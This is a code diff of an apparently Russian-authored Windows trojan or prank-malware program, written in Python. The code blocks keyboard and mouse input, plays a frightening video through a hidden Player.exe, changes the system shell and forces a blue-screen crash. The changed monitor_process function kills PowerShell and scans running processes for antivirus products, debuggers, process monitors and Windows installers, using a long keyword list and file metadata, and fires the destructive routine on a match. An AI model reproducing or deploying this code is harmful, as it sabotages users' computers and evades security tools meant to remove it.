@@ -1,15 +1,16 @@
 import ctypes
 import os
-import pygame
 import random
 import threading
 import tempfile
+import subprocess
 import sys
 import win32gui
 import time
+import win32api
 import psutil
 import win32con
-from moviepy.editor import VideoFileClip
+import miniaudio
 from regedit_and_virus_safe import BSOD, change_shell_aftervideo
 from start_gdi import stop_event
 
@@ -22,6 +23,8 @@ def resource_path(relative_path):
 
 ###
 file_path = r"C:\Windows\INF\iaLPSS2i_mausbhost_CNL.inf"
+music_stop_event = threading.Event()
+active_music_threads = []
 ###
 
 def set_wallpaper(image_path):
@@ -33,19 +36,6 @@ def set_wallpaper(image_path):
         except Exception as e:
             print(f"[EROR] {e}")
     threading.Thread(target=wallpaper_threading, daemon=True).start()
-
-
-def set_window_always_on_top(window_title="MoviePy"):
-    # Функция в цикле ищет окно с указанным заголовком и устанавливает его как topmost.
-    # Ждем появления окна
-    while True:
-        hwnd = win32gui.FindWindow(None, window_title)
-        if hwnd:
-            # Устанавливаем окно поверх всех
-            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
-                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
-            break
-        time.sleep(0.1)
 
 def remove_file_attributes(file_path):
     # Удаление атрибутов скрытого и системного
@@ -90,103 +80,232 @@ def change_txt_3():
 def play_video_fullscreen(video_path):
     stop_event.set()
     
-    def get_screen_size():
-        user32 = ctypes.windll.user32
-        user32.SetProcessDPIAware()
-        screen_width = user32.GetSystemMetrics(0)
-        screen_height = user32.GetSystemMetrics(1)
-        return screen_width, screen_height
+    player_exe_path = resource_path("Player.exe")
 
-    # Проверяем существование видео файла
     if not os.path.exists(video_path):
         print(f"[ERROR] Видео файл не найден: {video_path}")
-        BSOD()  # Немедленный BSOD если файла нет
+        BSOD()
+        return
+
+    if not os.path.exists(player_exe_path):
+        print(f"[ERROR] Плеер Player.exe не найден: {player_exe_path}")
+        BSOD()
         return
 
     try:
-        # Блокируем ввод
         ctypes.windll.user32.BlockInput(True)
-        screen_width, screen_height = get_screen_size()
 
-        # Пытаемся загрузить видео
-        clip = VideoFileClip(video_path)
-        clip_resized = clip.resize(width=screen_width, height=screen_height)
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = 0  # SW_HIDE
+
+        process = subprocess.Popen(
+            [player_exe_path, video_path],
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
 
     except Exception as e:
-        print(f"[ERROR] Ошибка загрузки видео: {e}")
-        BSOD()  # BSOD при ошибке загрузки/обработки видео
+        print(f"[ERROR] Ошибка при попытке инициализации Player.exe: {e}")
+        ctypes.windll.user32.BlockInput(False)
+        BSOD()
         return
 
-    def preview_video():
-        try:
-            clip_resized.preview(fullscreen=True, audio=True)
-        except Exception as e:
-            print(f"[ERROR] Ошибка воспроизведения: {e}")
-            BSOD()
-        finally:
-            clip_resized.close()
-
-    video_thread = threading.Thread(target=preview_video)
-    top_thread = threading.Thread(target=set_window_always_on_top)
-
-    video_thread.start()
-    top_thread.start()
-
-    video_thread.join()
-    top_thread.join()
+    process.wait()
     
     ctypes.windll.user32.BlockInput(False)
     change_txt_3()
     change_shell_aftervideo()
     time.sleep(0.5)
-    BSOD()  # BSOD после завершения видео
+    BSOD() 
+
+
+def get_safe_path(long_name):
+    buffer = ctypes.create_unicode_buffer(260)
+    result = ctypes.windll.kernel32.GetShortPathNameW(long_name, buffer, 260)
+    return buffer.value if result else long_name
+
+
+def stop_any_music():
+    global active_music_threads, music_stop_event
+    if any(t.is_alive() for t in active_music_threads):
+        music_stop_event.set()
+        time.sleep(0.15) 
+    music_stop_event.clear()
+
+
+def _miniaudio_loop_worker(file_name):
+    global music_stop_event
+    
+    try:
+        full_path = os.path.abspath(resource_path(file_name))
+        safe_path = get_safe_path(full_path)
+    except NameError:
+        full_path = os.path.abspath(file_name)
+        safe_path = get_safe_path(full_path)
+
+    if not os.path.isfile(safe_path):
+        print(f"[Ошибка] Файл не найден: {file_name}")
+        return
+
+    try:
+        def loop_stream_wrapper():
+            required_frames = yield b""
+            
+            while not music_stop_event.is_set():
+                original_stream = miniaudio.stream_file(safe_path)
+                try:
+                    while not music_stop_event.is_set():
+                        try:
+                            data = original_stream.send(required_frames)
+                        except StopIteration:
+                            break
+                        required_frames = yield data
+                finally:
+                    original_stream.close()
+
+        stream = loop_stream_wrapper()
+        next(stream) 
+
+        with miniaudio.PlaybackDevice() as device:
+            device.start(stream)
+            print(f"[OK] Музыка запущена (miniaudio): {file_name}")
+            
+            while device.running and not music_stop_event.is_set():
+                time.sleep(0.1)
+                
+            device.stop()
+
+    except Exception as e:
+        print(f"[Ошибка воспроизведения {file_name}]: {e}")
+
+
+def _start_music_thread(file_name):
+    global active_music_threads
+    
+    stop_any_music()
+    
+    t = threading.Thread(target=_miniaudio_loop_worker, args=(file_name,), daemon=True)
+    t.start()
+    
+    active_music_threads[:] = [th for th in active_music_threads if th.is_alive()]
+    active_music_threads.append(t)
 
 
 def playMusic_runappmain():
-    def play_main():
-        try:
-            pygame.mixer.init()
-            pygame.mixer.music.load(resource_path("runapp_main.MP3"))
-            pygame.mixer.music.set_volume(1.0)
-            pygame.mixer.music.play(-1)
-            print("[OK] Музыка запущена")
-        except Exception as e:
-            print(f"[Ошибка запуска музыки] {e}")
-    # Запуск в фоне
-    threading.Thread(target=play_main, daemon=True).start()
+    _start_music_thread("runapp_main.MP3")
 
 
 def playMusic_after50():
-    def play_50():
-        try:
-            pygame.mixer.stop()
-            pygame.mixer.music.load(resource_path("after50.mp3")) 
-            pygame.mixer.music.play(-1)
-            print("[OK] Музыка запущена")
-        except Exception as e:
-            print(f"[Ошибка запуска музыки] {e}")
-    # Запуск в фоне
-    threading.Thread(target=play_50, daemon=True).start()        
+    _start_music_thread("after50.mp3")
+
 
 def playmusic_for3():
-    pygame.mixer.stop()
-    pygame.mixer.music.load(resource_path("scaryfor3.MP3"))  # Загружаем музыку
-    pygame.mixer.music.play(-1)  # Воспроизведение (-1 означает бесконечный повтор)
+    _start_music_thread("scaryfor3.MP3")
 
 
-def monitor_process(processes=["mmc.exe", "msconfig.exe", "SystemPropertiesProtection.exe",
-"rstrui.exe", "RecoveryDrive.exe", "powershell.exe", "OpenConsole.exe", "mrt.exe",
-"resmon.exe", "perfmon.exe", "SecHealthUI.exe", "ProcessHacker.exe", "SimpleUnlocker.exe,"
-"SystemInformer.exe", "ProcessExplorer.exe", "Avast.exe", "Drweb.exe", "Kaspersky.exe", "Malwarebytes.exe"]):
+def monitor_process(video_path="Hacker2.mp4", check_interval=1):
+    TARGET_KEYWORDS = [
+        # Инструменты анализа процессов и мониторинга
+        "systeminformer", "processhacker", "processexplorer", "procmon", "procexp", "autoruns", "ccleaner",
+        "spyxx", "regshot", "wireshark", "fiddler", "charles", "tcpview", "netstat", "simpleunlocker", "unlocker", "powershell",
+        
+        # Установка Windows
+        "rufus", "windowsinstallationassistant", "setupprep", "setuphost", "windows10upgraderapp",
+
+        # Отладчики и декомпиляторы
+        "ollydbg", "x64dbg", "x32dbg", "ida64", "idag", "ghidra", "dnspy", "ilspy", 
+        "cheatengine", "scylla", "immunitydebugger", "windbg", "radare2", "reclass",
+        
+        # Антивирусное ПО и инструменты сканирования
+        "kaspersky", "drweb", "avast", "malwarebytes", "mcafee", "norton", "bitdefender",
+        "sophos", "eset", "nod32", "avg", "trendmicro", "comodo", "defenderui"
+    ]
+
+
+    [p.kill() for p in psutil.process_iter(['name']) if p.info['name'] == 'powershell.exe']
     
-    triggered = False
-    while True:
-        found = any(p.info['name'] in processes for p in psutil.process_iter(['name']))
-        if found and not triggered:
-            triggered = True
-            play_video_fullscreen(resource_path("Hacker2.mp4"))
-        time.sleep(1)
+    if not hasattr(monitor_process, "_checked_paths"):
+        monitor_process._checked_paths = {}
 
+    def get_metadata_and_check(file_path):
+        file_path = os.path.normpath(file_path.strip('"'))
+        
+        if file_path in monitor_process._checked_paths:
+            return monitor_process._checked_paths[file_path]
+
+        try:
+            version_info = win32api.GetFileVersionInfo(file_path, "\\VarFileInfo\\Translation")
+            if not version_info:
+                return False
+                
+            lang, codepage = version_info[0]
+            str_info = f"\\StringFileInfo\\{lang:04x}{codepage:04x}"
+            
+            fields = ['OriginalFilename', 'ProductName', 'FileDescription', 'InternalName']
+            metadata_parts = []
+            
+            for field in fields:
+                try:
+                    val = win32api.GetFileVersionInfo(file_path, f"{str_info}\\{field}")
+                    if val:
+                        metadata_parts.append(str(val).lower())
+                except Exception:
+                    continue
+            
+            full_text = " ".join(metadata_parts)
+            clean_text = "".join(ch for ch in full_text if ch.isalnum())
+            
+            for k in TARGET_KEYWORDS:
+                if k in clean_text:
+                    monitor_process._checked_paths[file_path] = True
+                    return True
+        except Exception:
+            pass
+            
+        monitor_process._checked_paths[file_path] = False
+        return False
+
+    print(f"[*] Мониторинг процессов запущен. База триггеров: {len(TARGET_KEYWORDS)} слов.")
+    triggered = False
+    seen_pids = set()
+
+    try:
+        while True:
+            for proc in psutil.process_iter(attrs=['pid', 'name', 'exe']):
+                try:
+                    pid = proc.info['pid']
+                    name = proc.info['name']
+                    path = proc.info['exe']
+
+                    if not name or pid in seen_pids:
+                        continue
+
+                    clean_name = "".join(ch for ch in name.lower() if ch.isalnum())
+                    is_match = any(k in clean_name for k in TARGET_KEYWORDS)
+
+                    if not is_match and path and os.path.exists(path):
+                        is_match = get_metadata_and_check(path)
+
+                    if is_match:
+                        seen_pids.add(pid)
+                        if not triggered:
+                            triggered = True
+                            print(f"\n[ALERT] Обнаружен софт (PID: {pid}, Name: {name}). Видео будет запущено")
+                            
+                            play_video_fullscreen(resource_path(video_path))
+
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
+                except Exception as e:
+                    print(f"[-] Ошибка анализа процесса: {e}")
+                    continue
+        
+            seen_pids = {p for p in seen_pids if psutil.pid_exists(p)}
+            time.sleep(check_interval)
+
+    except Exception as e:
+        print(f"[ERROR] Ошибка цикла проверки процессов: {e}")
 
 def monitor_mei_folders():
     def list_all_paths(folder):
